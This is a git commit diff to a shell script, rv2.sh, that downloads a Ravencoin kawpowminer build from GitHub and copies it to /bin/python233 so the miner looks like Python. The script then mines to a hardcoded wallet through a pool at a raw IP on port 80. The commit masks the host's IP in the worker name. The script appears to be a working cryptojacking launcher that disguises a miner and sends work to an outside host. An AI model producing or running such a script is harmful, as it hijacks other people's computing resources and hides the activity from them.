4d7e6a9a41f6b5ced29f22a33a5f03c76396c435
one10001 <78626503+one10001@users.noreply.github.com>
2021-03-11 05:59:38 +0100

    Update rv2.sh

--- rv2.sh
+++ rv2.sh
@@ -1,14 +1,12 @@
 #!bin/bash -xe 
 iip=$(curl https://ipecho.net/plain)
+IPNAME=$(sed 's|.|o|g' <<< $iip)
 curl ipinfo.io
-# Version 1.2.3
-# wget https://github.com/RavenCommunity/kawpowminer/releases/download/1.2.3/kawpowminer-ubuntu18-1.2.3.zip
-# unzip kawpowminer-ubuntu18-1.2.3.zip
-# version1.2.2
+
 wget https://github.com/one10001/kawpowminer/releases/download/7.0/kawpowminer_all70.tar.gz
 tar -xzf kawpowminer_all70.tar.gz
 ls -la
 cd kawpowminer/build/kawpowminer/
 chmod +x kawpowminer
 cp kawpowminer /bin/python233
-python233 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$iip@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
+python233 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
